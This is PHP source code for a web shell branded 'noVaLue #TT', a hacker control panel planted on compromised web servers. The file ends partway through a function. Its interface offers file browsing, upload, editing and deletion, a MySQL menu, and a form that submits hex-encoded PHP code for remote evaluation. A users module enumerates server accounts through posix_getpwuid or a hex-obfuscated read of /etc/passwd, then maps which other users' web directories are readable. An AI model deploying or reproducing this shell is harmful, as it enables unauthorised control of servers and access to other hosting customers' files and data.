<?php

	/*
	$stream = fopen("./.user.ini", 'wb');
	fwrite($stream, "magic_quotes_gpc=0;\n");
	fwrite($stream, "post_max_size=1024M;\n");
	fwrite($stream, "register_globals=1;\n");
	fwrite($stream, "upload_max_filesize=1024M;\n");
	fwrite($stream, "arg_separator.input='|';\n");
	fwrite($stream, "arg_separator.output='|';\n");
	fclose($stream);*/

	error_reporting(0);
	set_time_limit(0);
	session_start();
	
	if(function_exists("ini_set"))
		ini_set("error_log", "./err_log");
		
	class nVShl {
		public function dPlay($content) {echo $content;}

		function hexToStr($hex) {
			$string = '';
			for ($i=0; $i < strlen($hex)-1; $i+=2) {
				$string .= chr(hexdec($hex[$i].$hex[$i+1]));
			}
			return $string;
		}
		
		function strToHex($string) {
			$hex='';
			for ($i=0; $i < strlen($string); $i++) {
				$hex .= dechex(ord($string[$i]));
			}
			return $hex;
		}
		
		public function top($section) {
			$content = '';
			$content .= '<script type="text/javascript">
					function findPosX(obj) {
						var curleft = 0;
						if(obj.offsetParent)
							while(1) {
								curleft += obj.offsetLeft;
								if(!obj.offsetParent)
									break;
								obj = obj.offsetParent;
							}
						else if(obj.x)
							curleft += obj.x;
						return curleft;
					}
				
					function findPosY(obj) {
						var curtop = 0;
						if(obj.offsetParent)
							while(1) {
								curtop += obj.offsetTop;
								if(!obj.offsetParent)
									break;
								obj = obj.offsetParent;
							}
						else if(obj.y)
							curtop += obj.y;
						return curtop;
					}
					
					function home() {
						location.href = "http://'. $_SERVER['SERVER_NAME'].":".$_SERVER['SERVER_PORT'] . $_SERVER['SCRIPT_NAME'] .'?main";
					}
					function home_menu() {
						var tabMenu = document.getElementById("menuexp");
						var butHome = document.getElementById("butHome");
						butHome.setAttribute("style", "border-style:groove");
						var len = tabMenu.rows.length;
							
						if(len == 2) {
							if(tabMenu.title != "Home") {
								deactive_menu();
								tabMenu.deleteRow(len-1);
								tabMenu.title = "Home";
							}
						}

						if(len == 1) {
							var ele0 = document.createElement("input");
							ele0.type = "button";
							ele0.value = "General";
								
							var ele1 = document.createElement("input");
							ele1.type = "button";
							ele1.value = "Help";
								
							var ele2 = document.createElement("input");
							ele2.type = "button";
							ele2.value = "About";
							
							var rowMenu = tabMenu.insertRow(len);
							var cellMenu1 = rowMenu.insertCell(0);
							cellMenu1.appendChild(ele0);
							cellMenu1.appendChild(ele1);
							cellMenu1.appendChild(ele2);
						}
					}

					function ftp() {
						location.href = "http://'. $_SERVER['SERVER_NAME'].":".$_SERVER['SERVER_PORT'] . $_SERVER['SCRIPT_NAME'] .'?ftp";
					}
					function ftp_menu() {
						var tabMenu = document.getElementById("menuexp");
						var butFtp = document.getElementById("butFtp");
						butFtp.setAttribute("style", "border-style:groove");
						var len = tabMenu.rows.length;
						
						if(len == 2) {
							if(tabMenu.title != "Ftp") {
								deactive_menu();
								tabMenu.deleteRow(len-1);
								tabMenu.title = "Ftp";
							}
						}
						if(len == 1) {
							var ele0 = document.createElement("input");
							ele0.type = "radio";
							ele0.name = "ftp_file_upload_type";
							ele0.value = "uF1";
					
							if(ele0.value == "'.$_SESSION['ftp_file_upload_type'].'") 
								ele0.setAttribute("checked", 1);
							else 
								ele0.setAttribute("onclick", "upload_type(\'uF1\')");	
							
							
							var ele1 = document.createElement("label");
							ele1.setAttribute("style", "color:#036");
							ele1.innerHTML = "Session Upload ";

							var ele2 = document.createElement("input");
							ele2.type = "radio";
							ele2.name = "ftp_file_upload_type";
							ele2.value = "uF2";
							if(ele2.value == "'.$_SESSION['ftp_file_upload_type'].'")
								ele2.setAttribute("checked", 1);
							else
								ele2.setAttribute("onclick", "upload_type(\'uF2\')");	
							
							var ele3 = document.createElement("label");
							ele3.setAttribute("style", "color:#036");
							ele3.innerHTML = "Root Upload ";

							var rowMenu = tabMenu.insertRow(len);
							var cellMenu0 = rowMenu.insertCell(0);
							cellMenu0.width = findPosX(butFtp) - findPosX(butHome) - 4;
								
							var cellMenu1 = rowMenu.insertCell(1);
							cellMenu1.appendChild(ele0);
							cellMenu1.appendChild(ele1);
							cellMenu1.appendChild(ele2);
							cellMenu1.appendChild(ele3);
						}
					}
					function upload_type(type) {
						location.href = "http://'. $_SERVER['SERVER_NAME'].":".$_SERVER['SERVER_PORT'] . $_SERVER['SCRIPT_NAME'] .'?ftp_file_upload_type="+type;
					}
					function ftp_file_download(file) {
						location.href = "http://'. $_SERVER['SERVER_NAME'].":".$_SERVER['SERVER_PORT'] . $_SERVER['SCRIPT_NAME'] .'?ftp_file_download="+file;
					}
					
					function ftp_file_delete(mode, dir, file, method, type) {
						if (confirm("Delete the file: " + file + " ?")) { 
							method = method || "post";
				
							if(mode == 2)
								document.getElementById("info").innerHTML = "Trying to delete file !";
							
							var form = document.createElement("form");
							form.setAttribute("action", "?t-t&chdir="+dir);
							form.setAttribute("method", method);
							form.setAttribute("style", "display:none");
							
							var hiddenField = document.createElement("input");
							hiddenField.setAttribute("type", "hidden");
							hiddenField.setAttribute("name", "delete");
							hiddenField.setAttribute("value", file);
							
							var hiddenField2 = document.createElement("input");
							hiddenField2.setAttribute("type", "hidden");
							hiddenField2.setAttribute("name", "type");
							hiddenField2.setAttribute("value", type);
				
							form.appendChild(hiddenField);
							form.appendChild(hiddenField2);
							document.body.appendChild(form);
							
							form.submit();
						}
					}
					
					function ftp_file_save(dir, file, method) {
						method = method || "post";
						
						document.getElementById("info").innerHTML = "Trying to save file !";
						
						var form = document.createElement("form");
						form.setAttribute("action", "?t-t&chdir="+dir+"&file="+file);
						form.setAttribute("method", method);
						form.setAttribute("style", "display:none");
						
						var hiddenField = document.createElement("input");
						hiddenField.setAttribute("type", "hidden");
						hiddenField.setAttribute("name", "save");
						hiddenField.setAttribute("value", file);
							
						var ctr = document.createElement("input");
						ctr.setAttribute("type", "hidden");
						ctr.setAttribute("name", "vedit");
						ctr.setAttribute("value", encToHex(document.getElementById("pad").value));
				
						form.appendChild(hiddenField);
						form.appendChild(ctr);
						document.body.appendChild(form);
						
						form.submit();
					}
					
					function mysql() {
						location.href = "http://'. $_SERVER['SERVER_NAME'].":".$_SERVER['SERVER_PORT'] . $_SERVER['SCRIPT_NAME'] .'?mysql";
					}
					function mysql_menu() {
						var tabMenu = document.getElementById("menuexp");
						var butMysql = document.getElementById("butMysql");
						butMysql.setAttribute("style", "border-style:groove");
						var len = tabMenu.rows.length;
						
						if(len == 2) {
							if(tabMenu.title != "MySql") {
								deactive_menu();
								tabMenu.deleteRow(len-1);
								tabMenu.title = "MySql";
							}
						}
						
						if(len == 1) {
							var ele0 = document.createElement("input");
							ele0.type = "button";
							ele0.title = "ftp";
							ele0.value = "SQL1";
									
							var ele1 = document.createElement("input");
							ele1.type = "button";
							ele1.title = "ftp";
							ele1.value = "SQL2";
									
							var ele2 = document.createElement("input");
							ele2.type = "button";
							ele2.title = "ftp";
							ele2.value = "SQL3";
							
							var rowMenu = tabMenu.insertRow(len);
							var cellMenu0 = rowMenu.insertCell(0);
							cellMenu0.width = findPosX(butMysql) - findPosX(butHome) - 4;
								
							var cellMenu1 = rowMenu.insertCell(1);
							cellMenu1.appendChild(ele0);
							cellMenu1.appendChild(ele1);
							cellMenu1.appendChild(ele2);
						}
					}
					
					function users() {
						location.href = "http://'. $_SERVER['SERVER_NAME'].":".$_SERVER['SERVER_PORT'] . $_SERVER['SCRIPT_NAME'] .'?users";
					}
					function users_menu() {
						var tabMenu = document.getElementById("menuexp");
						var butUsers = document.getElementById("butUsers");
						butUsers.setAttribute("style", "border-style:groove");
						var len = tabMenu.rows.length;
						
						if(len == 2) {
							if(tabMenu.title != "Users") {
								deactive_menu();
								tabMenu.deleteRow(len-1);
								tabMenu.title = "Users";
							}
						}
						
						if(len == 1) {
							// First
							var ele0 = document.createElement("input");
							ele0.type = "radio";
							ele0.name = "users_mode";
							ele0.value = "uScan";
							if(ele0.value == "'.$_SESSION['users_mode'].'") 
								ele0.setAttribute("checked", 1);
							else 
								ele0.setAttribute("onclick", "users_type(\'uScan\')");	
									
							var ele1 = document.createElement("label");
							ele1.setAttribute("style", "color:#036");
							ele1.innerHTML = "PHP Scan ";
							
							// Second
							var ele2 = document.createElement("input");
							ele2.type = "radio";
							ele2.name = "users_mode";
							ele2.value = "uPasswd";
							if(ele2.value == "'.$_SESSION['users_mode'].'")
								ele2.setAttribute("checked", 1);
							else
								ele2.setAttribute("onclick", "users_type(\'uPasswd\')");	
							
							var ele3 = document.createElement("label");
							ele3.innerHTML = "'.$this->hexToStr('2f6574632f706173737764').'";

							
							if("'.$_SESSION['users_passwd'].'" == "true") {
								ele3.setAttribute("style", "color:#036");

								var ele4 = document.createElement("input");
								ele4.type = "text";
								ele4.id = "user_root_dir";
								ele4.value = "'.$_SESSION['users_dir'].'";
								
								var ele5 = document.createElement("input");
								ele5.setAttribute("style", "border-style:none");
								ele5.type = "button";
								ele5.value = "Select";
								ele5.setAttribute("onclick", "users_dir(\"'.$_SESSION['users_mode'].'\")");
							}
							
							var rowMenu = tabMenu.insertRow(len);
							var cellMenu0 = rowMenu.insertCell(0);
							cellMenu0.width = findPosX(butUsers) - findPosX(butHome) - 4;
								
							var cellMenu1 = rowMenu.insertCell(1);
							cellMenu1.appendChild(ele0);	cellMenu1.appendChild(ele1);
							cellMenu1.appendChild(ele2);	cellMenu1.appendChild(ele3);
							cellMenu1.appendChild(ele4);	cellMenu1.appendChild(ele5);
						}
					}
					function users_type(mode) {
						location.href = "http://'. $_SERVER['SERVER_NAME'].':'.$_SERVER['SERVER_PORT'] . $_SERVER['SCRIPT_NAME'] .'?users&users_mode="+mode;
					}
					
					function users_dir(mode) {	
						var dir = document.getElementById("user_root_dir").value;
						location.href = "http://'. $_SERVER['SERVER_NAME'].':'.$_SERVER['SERVER_PORT'] . $_SERVER['SCRIPT_NAME'] .'?users&users_mode="+mode+"&users_dir="+dir;
					}
					
					function system() {
						location.href = "http://'. $_SERVER['SERVER_NAME'].':'.$_SERVER['SERVER_PORT'] . $_SERVER['SCRIPT_NAME'] .'?system";
					}
					function system_menu() {
						var tabMenu = document.getElementById("menuexp");
						var butSystem = document.getElementById("butSystem");
						butSystem.setAttribute("style", "border-style:groove");
						var len = tabMenu.rows.length;
						
						if(len == 2) {
							if(tabMenu.title != "System") {
								deactive_menu();
								tabMenu.deleteRow(len-1);
								tabMenu.title = "System";
							}
						}
						
						if(len == 1) {
							var ele0 = document.createElement("input");
							ele0.type = "button";
							ele0.title = "ftp";
							ele0.value = "U1";
									
							var ele1 = document.createElement("input");
							ele1.type = "button";
							ele1.title = "system";
							ele1.value = "U2";
									
							var ele2 = document.createElement("input");
							ele2.type = "button";
							ele2.title = "butSystem";
							ele2.value = "U3";
							
							var rowMenu = tabMenu.insertRow(len);
							var cellMenu0 = rowMenu.insertCell(0);
							cellMenu0.width = findPosX(butSystem) - findPosX(butHome) - 4;
								
							var cellMenu1 = rowMenu.insertCell(1);
							cellMenu1.appendChild(ele0);
							cellMenu1.appendChild(ele1);
							cellMenu1.appendChild(ele2);
						}
					}
					function system_php_eval() {
						var form = document.createElement("form");
						form.setAttribute("action", "?t-t");
						form.setAttribute("method", "post");
						form.setAttribute("style", "display:none");

						var ctr = document.createElement("input");
						ctr.setAttribute("type", "hidden");
						ctr.setAttribute("name", "seteval");
						ctr.setAttribute("value", encToHex(document.getElementById("doeval").value));

						form.appendChild(ctr);
						document.body.appendChild(form);
						
						form.submit();
					}
					
					function deactive_menu() {			
						var tabMenu = document.getElementById("menuexp");
						var tabRow = tabMenu.rows[0];
						var tabRowCell = tabRow.cells[0];
						var countCellE = tabRowCell.childNodes.length;

						for(var i=0; i<countCellE; i++) {
							if(tabRowCell.childNodes[i].type == "button")
								tabRowCell.childNodes[i].setAttribute("style", "border-style:none");
						}
					}
					function menu_close(e) {
						var posy = 0;
						if (!e) var e = window.event;
						if (e.pageY) 	{
							posy = e.pageY;
						}else if (e.clientY) 	{
							posy = e.clientY + document.body.scrollTop + document.documentElement.scrollTop;
						}
						
						var tabMenu = document.getElementById("menuexp");
						var len = tabMenu.rows.length;
						var fromTop = findPosY(tabMenu) + tabMenu.offsetHeight;
						
						if(len == 2 && fromTop < posy) {
							tabMenu.deleteRow(len-1);
							deactive_menu();
						}
					}
					
					function encToHex(str){
						var alph = new Array("0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "a", "b", "c", "d", "e", "f");
						var output = "";
						var charVal;
						for(var i=0; i<str.length; i++) {
							charVal = str.charCodeAt(i);
							output += alph[Math.floor(charVal/16)] + alph[charVal%16];
						}
						return output;
					}
					
					
				</script>';
			$content .= '<script type="text/javascript">
				function xhr(tp, act, val, fId,  pt/*Post*/, dt/*Data*/, dup/*Data Upload*/, fl/*File if set*/) {
					var xhr;

					var frm  = fId|| "none";
					var type = pt || "GET";
					var data = dt || "";
					var updt = dup|| false;
					var file = fl || null;
			
					if(tp.length == 0 || act.length == 0 || val.length ==0) {
						if(frm != "none")
							return "[xhr]Error: Invalid request.";	
						return;
					}
					
					if(window.XMLHttpRequest) {
						xhr = new XMLHttpRequest();
					}else {
						xhr = new ActiveXObject("Microsoft.XMLHTTP");	
					}
				
					xhr.onreadystatechange = function() {
						if(xhr.readyState == 4 && xhr.status == 200) {
							if(frm instanceof popup_file) {
								var body = frm.getFileBody();
								body.innerHTML = xhr.responseText;
							}else if(frm != "none") {
								document.getElementById(frm).innerHTML = xhr.responseText;
							}
								
							parseScript(xhr.responseText);
						}			
					}
				
					xhr.open(type, "?tp="+tp+"&act="+act+"&val="+encToHex(val), false); 
				
					if(type == "POST") {
						// Daca uploadez fisier
						if(updt) {
							var frmData = new FormData();
							
							frmData.append("updt", updt);
							
							if(data.length > 0) 
								frmData.append("data", data);
							
							if(file instanceof Object && file != null)
								frmData.append("upNFile", file);	
							
							xhr.send(frmData);
						}else {
							if(data.length > 0) {
								var fdata = "updt="+updt+"&data="+data;
								xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
								xhr.send(fdata);
							}
						}
					}else {
						xhr.send(null);	
					}
				}
				
				function parseScript(strcode) {
					var scripts = new Array();        
				
					while(strcode.indexOf("<script") > -1 || strcode.indexOf("</script") > -1) {
						var s = strcode.indexOf("<script");
						var s_e = strcode.indexOf(">", s);
						var e = strcode.indexOf("</script", s);
						var e_e = strcode.indexOf(">", e);
						
						// Add to scripts array
						scripts.push(strcode.substring(s_e+1, e));
						// Strip from strcode
						strcode = strcode.substring(0, s) + strcode.substring(e_e+1);
					}
				
					for(var i=0; i<scripts.length; i++) {
						try {
							eval(scripts[i]);
						}
						catch(ex) {}
					}
				}
		</script>';
			if( ini_get('safe_mode') ){
				// Do it the safe mode way
			}else{
				// Do it the regular way
			}
			$disablefunc = ini_get("disable_functions");
			$disablefunc = str_replace(",", ", ", $disablefunc);
			
			$content .= '<html><title>noVaLue #TT - '.$section.'</title><body bgcolor="#000000" text="#ff4400" onmousemove="menu_close(event);">
					<table width="100%">
						<tr><td><font size="2">Safe Mode: '.(ini_get('safe_mode')? "On":"Off").'</font></td>
						<tr><td><font size="2">Disable Functions: '.(strlen(trim($disablefunc))==0?'NONE':$disablefunc).'</font></td></tr>
					</table>
					<table width="100%"><tr><td><center><table bgcolor="#99CC00" width="100%" id="menuexp"><tr><td colspan="10">
					<input type="button" id="butHome" value="Home" onmousemove="home_menu();" onmo onclick="home();" style="border-style:none">
					<input type="button" id="butFtp" value="Ftp" onmousemove="ftp_menu();" onclick="ftp();" style="border-style:none">
					<input type="button" id="butMysql" value="MySQL" onmousemove="mysql_menu();" onclick="mysql();" style="border-style:none">
					<input type="button" id="butUsers" value="Users" onmousemove="users_menu();" onclick="users();" style="border-style:none">
					<input type="button" id="butSystem" value="System" onmousemove="system_menu();" onclick="system();" style="border-style:none">
					</td></tr></table></center></td></tr><tr><td>';
			$this->dPlay($content);
		}
		
		public function logo() {
			$content = "";
			$content .= '<center><table bgcolor="#99CC00"><tr><td><font color="#495099">';
			$content .= '% &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; % &nbsp; &nbsp; ';
			$content .= '&nbsp; &nbsp; % % &nbsp; &nbsp; &nbsp; ';
			$content .= "&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; %";
			$content .= "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
			$content .= "% &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>";
			
			$content .= "%%&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%&nbsp;&nbsp;&nbsp;";
			$content .= "&nbsp;&nbsp;%&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%&nbsp;&nbsp;&nbsp;";
			$content .= "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%&nbsp;%";
			$content .= "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
			$content .= "%&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%&nbsp;&nbsp;&nbsp;%%%%<br>";
			
			$content .= "%&nbsp;&nbsp;&nbsp;%&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%&nbsp;&nbsp;&nbsp;";
			$content .= "&nbsp;%&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%&nbsp;&nbsp;";
			$content .= "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%&nbsp;&nbsp;&nbsp;&nbsp;%";
			$content .= "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
			$content .= "%&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>";
			
			$content .= "%&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%&nbsp;&nbsp;&nbsp;";
			$content .= "%&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%&nbsp;";
			$content .= "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%";
			$content .= "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
			$content .= "%&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>";
			
			$content .= "%&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%&nbsp;&nbsp;&nbsp;";
			$content .= "%&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp&nbsp;%&nbsp;";
			$content .= "&nbsp;%&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%%%%%";
			$content .= "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
			$content .= "%&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%&nbsp;&nbsp;&nbsp;%%%%<br>";
			
			$content .= "%&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%&nbsp;&nbsp;&nbsp;%&nbsp;&nbsp;&nbsp;";
			$content .= "&nbsp;%&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%&nbsp;&nbsp;";
			$content .= "&nbsp;&nbsp;&nbsp;&nbsp;%&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%";
			$content .= "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
			$content .= "%&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>";
			
			$content .= "%&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%&nbsp;%&nbsp;&nbsp;&nbsp;";
			$content .= "&nbsp;&nbsp;%&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%&nbsp;&nbsp;&nbsp;&nbsp;";
			$content .= "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%";
			$content .= "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
			$content .= "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>";
			
			$content .= "%&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
			$content .= "&nbsp;&nbsp;&nbsp;%&nbsp;%&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
			$content .= "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%";
			$content .= "%%%%%%";
			$content .= "&nbsp;&nbsp;&nbsp;%%%%%&nbsp;&nbsp;&nbsp;%%%%<br>";
		
			$content .= "</font></td></tr></table></center>";
			
			$this->dPlay($content);
		}
		
		public function buttom() {
			$content = '</td></tr><tr><td><center>Copyright @ noVaLue - 2012 - # Doom\'s Day #</center></td></tr></table></body></html>';
			$this->dPlay($content);
		}
		
		public function get_users(){
			$content = '<table style="border-color:#9F0" width="70%" border="0" align="center">
			<tr bgcolor="#99CC00"><td align="center" style="border-style:groove;"><font color="#444444">User</font></td>
			<td align="center" style="border-style:groove;"><font color="#444444">Path</font></td>
			<td align="center" style="border-style:groove;"><font color="#444444">Access</font></td>
			<td align="center" style="border-style:groove;"><font color="#444444">Domain(s)</font></td></tr>';
			$this->dPlay($content);
			
			if($_SESSION['users_mode'] == "uScan" && function_exists("posix_getpwuid")) {
				for($i=0, $j=0, $u=0;$j<1000;$i++) {
					$content = "";
					if($data = posix_getpwuid($i)) {
						if($this->str_startsWith($_SESSION['users_dir'], $data['dir'])) {
							$data['dom'] = $this->get_user_dom($data['dir']);
							if(sizeof($data['dom']) > 0) {
								if($data['dom'][0] != "about:blank")
									$data['dir'] .= "/public_html";
								else ///////////////////////////////////////////////////////////////////
									$data['dir'] .= "/public_html";
									
								$rootDirs = explode("/", $data['dir']);
								$pathDirs = "";
								$data['dir'] = "";
								for($a = 0; $a<sizeof($rootDirs); $a++)
									if($rootDirs[$a] != "") {
										$pathDirs .= "/".$rootDirs[$a];
										if($this->is_path_readable($pathDirs))
											$data['dir'] .= '<a href="?t-t&chdir='.$pathDirs.'" target="_blank" style="text-decoration:none"><font color="#00FF00">/'.$rootDirs[$a].'</font></a>';
										else
											$data['dir'] .= '<font color="#FF0000">/'.$rootDirs[$a].'</font>';
									}
								
								$content .= '<tr bgcolor='.($u%2 != 0 ? "#002200": "#110011").'>';
								$content .= '<td><font color="white"><b>'.$data['name'].'</b></font></td>';
				
								$content .= '<td>'.$data['dir'].'</td>';
								$content .= '<td>'.(($this->is_path_readable($pathDirs)) ? '<font color=green>[<a href="?t-t&chdir='.$pathDirs.'" target="_blank"  style="text-decoration:none"><font color="white">&radic;</font></a>] Can read</font>':"<font color=red>[&chi;] Can't read</font>").'</td>';
								$content .= '<td align="center"><b>[ <font color="white">'.sizeof($data['dom']).'</font> ]</b>
												<select id="dom_link'.$u.'" style="border-style:none; width:200">';
							
								for($k=0; $k<sizeof($data['dom']); $k++)
									$content .= '<option value="http://'.$data['dom'][$k].'">'.$data['dom'][$k].'</option>';
							
								$content .= '</select><input type="button" value="View" style="border-style:none" 
												onclick="window.open(document.getElementById(\'dom_link'.$u.'\').value);"></td></tr>';
								$u++;
							}
						}
						$j=0;
					}else {
						$j++;
					}
					$this->dPlay($content);
				}
			}
			
			if($_SESSION['users_mode'] == "uPasswd") {
				if(is_array($passwd = $this->get_file_content($this->hexToStr('2f6574632f706173737764'), true))) {
					$u = 0; 
					foreach($passwd as $usr) {
						$content = "";
						$disUsr = explode(":", $usr);
						$data['name'] = $disUsr[0];
						$data['dir'] = $disUsr[5];	

						if($this->str_startsWith($_SESSION['users_dir'], $data['dir'])) {
							$data['dom'] = $this->get_user_dom($data['dir']);
							
							if(sizeof($data['dom']) > 0) {
								if($data['dom'][0] != "about:blank")
									$data['dir'] .= "/public_html";
								else ///////////////////////////////////////////////////////////////////
									$data['dir'] .= "/public_html";
									
								$rootDirs = explode("/", $data['dir']);
								$pathDirs = "";
								$data['dir'] = "";
								for($a = 0; $a<sizeof($rootDirs); $a++) {
									if($rootDirs[$a] != "") {
										$pathDirs .= "/".$rootDirs[$a];
										if($this->is_path_readable($pathDirs))
											$data['dir'] .= '<a href="?t-t&chdir='.$pathDirs.'" target="_blank" style="text-decoration:none"><font color="#00FF00">/'.$rootDirs[$a].'</font></a>';
										else
											$data['dir'] .= '<font color="#FF0000">/'.$rootDirs[$a].'</font>';
									}
								}
							
								$content .= '<tr bgcolor='.($u%2 != 0 ? "#002200": "#110011").'>';
